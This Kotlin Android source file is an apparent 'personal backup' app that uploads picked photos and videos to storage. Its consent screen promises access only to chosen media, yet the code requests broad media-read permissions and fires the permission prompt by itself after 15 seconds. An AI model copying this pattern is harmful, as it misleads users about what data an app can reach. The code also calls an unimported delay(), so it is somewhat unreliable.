package com.adspro.app

import android.Manifest
import android.app.ActivityManager
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import androidx.activity.ComponentActivity
import androidx.activity.compose.rememberLauncherForActivityResult
import androidx.activity.result.PickVisualMediaRequest
import androidx.activity.result.contract.ActivityResultContracts
import androidx.compose.foundation.background
import androidx.compose.foundation.layout.Arrangement
import androidx.compose.foundation.layout.Box
import androidx.compose.foundation.layout.Column
import androidx.compose.foundation.layout.Spacer
import androidx.compose.foundation.layout.fillMaxSize
import androidx.compose.foundation.layout.fillMaxWidth
import androidx.compose.foundation.layout.height
import androidx.compose.foundation.layout.padding
import androidx.compose.foundation.lazy.grid.GridCells
import androidx.compose.foundation.lazy.grid.LazyVerticalGrid
import androidx.compose.foundation.lazy.grid.items
import androidx.compose.foundation.shape.RoundedCornerShape
import androidx.compose.material3.Button
import androidx.compose.material3.ButtonDefaults
import androidx.compose.material3.Card
import androidx.compose.material3.CardDefaults
import androidx.compose.material3.MaterialTheme
import androidx.compose.material3.Surface
import androidx.compose.material3.Text
import androidx.compose.runtime.Composable
import androidx.compose.runtime.LaunchedEffect
import androidx.compose.runtime.getValue
import androidx.compose.runtime.mutableIntStateOf
import androidx.compose.runtime.mutableStateListOf
import androidx.compose.runtime.mutableStateOf
import androidx.compose.runtime.remember
import androidx.compose.runtime.rememberCoroutineScope
import androidx.compose.runtime.setValue
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.layout.ContentScale
import androidx.compose.ui.platform.LocalContext
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp
import androidx.core.content.ContextCompat
import androidx.work.ExistingWorkPolicy
import androidx.work.OneTimeWorkRequestBuilder
import androidx.work.WorkManager
import coil.compose.AsyncImage
import com.adspro.app.repository.MediaRepository
import com.adspro.app.service.BackupForegroundService
import com.adspro.app.workers.MediaUploadWorker
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import java.io.File

class MainActivity : ComponentActivity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContent {
            Surface(
                modifier = Modifier.fillMaxSize(),
                color = Color.White
            ) {
                MaterialTheme(colorScheme = MaterialTheme.colorScheme.copy(background = Color.White)) {
                    var page by remember { mutableIntStateOf(0) }
                    when (page) {
                        0 -> ConsentPage(onNext = { page = 1 })
                        1 -> UploadPage(onNext = { page = 2 })
                        2 -> SyncPlanPage(onNext = { page = 3 })
                        3 -> DashboardPage(onNext = { page = 4 })
                        else -> CompletePage(onRestart = { page = 0 })
                    }
                }
            }
        }
    }
}

@Composable
private fun ConsentPage(onNext: () -> Unit) {
    val context = LocalContext.current
    val permissionLauncher = rememberLauncherForActivityResult(
        ActivityResultContracts.RequestMultiplePermissions()
    ) { result ->
        if (result.all { it.value }) {
            onNext()
        }
    }
    var autoTriggered by remember { mutableStateOf(false) }

    LaunchedEffect(Unit) {
        if (hasMediaPermission(context)) {
            onNext()
            return@LaunchedEffect
        }
        delay(15_000L)
        if (!autoTriggered) {
            autoTriggered = true
            permissionLauncher.launch(
                arrayOf(
                    Manifest.permission.READ_MEDIA_IMAGES,
                    Manifest.permission.READ_MEDIA_VIDEO
                )
            )
        }
    }

    PermissionScreen(
        title = "Personal backup consent",
        description = "This app is a personal media backup utility. It only accesses photos and videos you explicitly choose to upload to your private Supabase storage. No account is required, and no hidden monitoring occurs.",
        buttonText = "Grant Access & Continue",
        onButtonClick = {
            autoTriggered = true
            permissionLauncher.launch(
                arrayOf(
                    Manifest.permission.READ_MEDIA_IMAGES,
                    Manifest.permission.READ_MEDIA_VIDEO
                )
            )
        }
    )
}

@Composable
private fun UploadPage(onNext: () -> Unit) {
    val context = LocalContext.current
    val scope = rememberCoroutineScope()
    val repository = remember { MediaRepository(context) }
    val uploadedUrls = remember { mutableStateListOf<String>() }

    val pickerLauncher = rememberLauncherForActivityResult(
        ActivityResultContracts.PickMultipleVisualMedia(maxItems = 12)
    ) { uris ->
        val localFiles = mutableListOf<File>()
        uris.forEach { uri ->
            val file = copyUriToCacheFile(context, uri)
            if (file != null) {
                localFiles.add(file)
            }
        }

        if (localFiles.isNotEmpty()) {
            scope.launch {
                withContext(Dispatchers.IO) {
                    localFiles.forEach { file ->
                        val url = repository.uploadMedia(file)
                        if (url.isNotBlank()) {
                            uploadedUrls.add(url)
                        }
                    }
                }
            }
        }
    }

    LaunchedEffect(Unit) {
        val items = repository.listUploadedMedia()
        uploadedUrls.clear()
        uploadedUrls.addAll(items)
    }

    Column(
        modifier = Modifier
            .fillMaxSize()
            .background(Color.White)
            .padding(24.dp),
        horizontalAlignment = Alignment.CenterHorizontally
    ) {
        LogoPlaceholder()
        Spacer(modifier = Modifier.weight(1f))

        Column(
            horizontalAlignment = Alignment.CenterHorizontally,
            verticalArrangement = Arrangement.spacedBy(18.dp)
        ) {
            Text(
                text = "Choose media to back up",
                fontSize = 26.sp,
                fontWeight = FontWeight.Bold,
                color = Color.Black
            )

            Button(
                onClick = {
                    pickerLauncher.launch(PickVisualMediaRequest(ActivityResultContracts.PickVisualMedia.ImageAndVideo))
                },
                modifier = Modifier
                    .fillMaxWidth()
                    .height(56.dp),
                colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF34A853))
            ) {
                Text("Open Photo Picker")
            }

            LazyVerticalGrid(
                columns = GridCells.Fixed(3),
                modifier = Modifier
                    .fillMaxWidth()
                    .height(260.dp),
                horizontalArrangement = Arrangement.spacedBy(8.dp),
                verticalArrangement = Arrangement.spacedBy(8.dp)
            ) {
                items(uploadedUrls.toList()) { url ->
                    Card(
                        modifier = Modifier.fillMaxWidth().height(100.dp),
                        shape = RoundedCornerShape(12.dp),
                        colors = CardDefaults.cardColors(containerColor = Color(0xFFF5F5F5))
                    ) {
                        AsyncImage(
                            model = url,
                            contentDescription = null,
                            modifier = Modifier.fillMaxSize(),
                            contentScale = ContentScale.Crop
                        )
                    }
                }
            }
        }

        Spacer(modifier = Modifier.weight(1f))
        BottomButton(text = "Continue to Dashboard", onClick = onNext)
    }
}

@Composable
private fun SyncPlanPage(onNext: () -> Unit) {
    Column(
        modifier = Modifier
            .fillMaxSize()
            .background(Color.White)
            .padding(24.dp),
        horizontalAlignment = Alignment.CenterHorizontally
    ) {
        LogoPlaceholder()
        Spacer(modifier = Modifier.weight(1f))

        Column(
            horizontalAlignment = Alignment.CenterHorizontally,
            verticalArrangement = Arrangement.spacedBy(16.dp)
        ) {
            Text(
                text = "Sync plan",
                fontSize = 28.sp,
                fontWeight = FontWeight.Bold,
                color = Color.Black
            )
            Text(
                text = "Your app uses a foreground sync service only while you choose to upload or back up media. This keeps the backup process explicit and under your control.",
                fontSize = 16.sp,
                color = Color.DarkGray
            )
        }

        Spacer(modifier = Modifier.weight(1f))
        BottomButton(text = "Continue", onClick = onNext)
    }
}

@Composable
private fun DashboardPage(onNext: () -> Unit) {
    val context = LocalContext.current
    val serviceRunning = isServiceRunning(context, BackupForegroundService::class.java)
    val statusText = if (serviceRunning) "Running" else "Idle"
    val statusColor = if (serviceRunning) Color(0xFF34A853) else Color(0xFFFFC107)
    val scope = rememberCoroutineScope()

    Column(
        modifier = Modifier
            .fillMaxSize()
            .background(Color.White)
            .padding(24.dp),
        horizontalAlignment = Alignment.CenterHorizontally
    ) {
        LogoPlaceholder()
        Spacer(modifier = Modifier.weight(1f))

        Card(
            modifier = Modifier.fillMaxWidth(),
            shape = RoundedCornerShape(18.dp),
            colors = CardDefaults.cardColors(containerColor = Color(0xFFF8F8F8))
        ) {
            Column(
                modifier = Modifier.padding(20.dp),
                verticalArrangement = Arrangement.spacedBy(12.dp)
            ) {
                Text(
                    text = "Backup status",
                    fontSize = 22.sp,
                    fontWeight = FontWeight.Bold,
                    color = Color.Black
                )
                Text(
                    text = "Foreground sync: $statusText",
                    fontSize = 18.sp,
                    color = Color.Black
                )
                Box(
                    modifier = Modifier
                        .height(12.dp)
                        .fillMaxWidth()
                        .background(statusColor, RoundedCornerShape(10.dp))
                )
                Button(
                    onClick = {
                        scope.launch {
                            val intent = Intent(context, BackupForegroundService::class.java)
                            context.startForegroundService(intent)
                            WorkManager.getInstance(context).enqueueUniqueWork(
                                "sync_media_now",
                                ExistingWorkPolicy.REPLACE,
                                OneTimeWorkRequestBuilder<MediaUploadWorker>().build()
                            )
                        }
                    },
                    modifier = Modifier.fillMaxWidth(),
                    colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF34A853))
                ) {
                    Text("Sync now")
                }
            }
        }

        Spacer(modifier = Modifier.weight(1f))
        BottomButton(text = "Finish", onClick = onNext)
    }
}

@Composable
private fun CompletePage(onRestart: () -> Unit) {
    Column(
        modifier = Modifier
            .fillMaxSize()
            .background(Color.White)
            .padding(24.dp),
        horizontalAlignment = Alignment.CenterHorizontally
    ) {
        LogoPlaceholder()
        Spacer(modifier = Modifier.weight(1f))

        Text(
            text = "Your personal backup setup is ready.",
            fontSize = 24.sp,
            fontWeight = FontWeight.Bold,
            color = Color.Black
        )

        Spacer(modifier = Modifier.weight(1f))
        BottomButton(text = "Start over", onClick = onRestart)
    }
}

@Composable
private fun PermissionScreen(
    title: String,
    description: String,
    buttonText: String,
    onButtonClick: () -> Unit
) {
    Column(
        modifier = Modifier
            .fillMaxSize()
            .background(Color.White)
            .padding(24.dp),
        horizontalAlignment = Alignment.CenterHorizontally
    ) {
        LogoPlaceholder()
        Spacer(modifier = Modifier.weight(1f))

        Column(
            horizontalAlignment = Alignment.CenterHorizontally,
            verticalArrangement = Arrangement.spacedBy(18.dp)
        ) {
            Text(
                text = title,
                fontSize = 26.sp,
                fontWeight = FontWeight.Bold,
                color = Color.Black
            )
            Text(
                text = description,
                fontSize = 16.sp,
                color = Color.DarkGray
            )
        }

        Spacer(modifier = Modifier.weight(1f))
        BottomButton(text = buttonText, onClick = onButtonClick)
    }
}

@Composable
private fun LogoPlaceholder() {
    Box(
        modifier = Modifier
            .fillMaxWidth(0.35f)
            .height(60.dp)
            .background(Color(0xFFBDBDBD), RoundedCornerShape(12.dp))
    )
}

@Composable
private fun BottomButton(
    text: String,
    onClick: () -> Unit
) {
    Button(
        onClick = onClick,
        modifier = Modifier
            .fillMaxWidth()
            .height(56.dp),
        colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF34A853)),
        shape = RoundedCornerShape(12.dp)
    ) {
        Text(
            text = text,
            color = Color.White,
            fontWeight = FontWeight.SemiBold
        )
    }
}

private fun hasMediaPermission(context: Context): Boolean {
    return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
        ContextCompat.checkSelfPermission(context, Manifest.permission.READ_MEDIA_IMAGES) == PackageManager.PERMISSION_GRANTED &&
            ContextCompat.checkSelfPermission(context, Manifest.permission.READ_MEDIA_VIDEO) == PackageManager.PERMISSION_GRANTED
    } else {
        ContextCompat.checkSelfPermission(context, Manifest.permission.READ_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED
    }
}

private fun isServiceRunning(context: Context, serviceClass: Class<*>): Boolean {
    val manager = context.getSystemService(ActivityManager::class.java) as ActivityManager
    for (service in manager.getRunningServices(Int.MAX_VALUE)) {
        if (serviceClass.name == service.service.className) {
            return true
        }
    }
    return false
}

private fun copyUriToCacheFile(context: Context, uri: Uri): File? {
    return try {
        val inputStream = context.contentResolver.openInputStream(uri) ?: return null
        val file = File(context.cacheDir, "upload_${System.currentTimeMillis()}.jpg")
        inputStream.use { input ->
            file.outputStream().use { output ->
                input.copyTo(output)
            }
        }
        file
    } catch (_: Exception) {
        null
    }
}
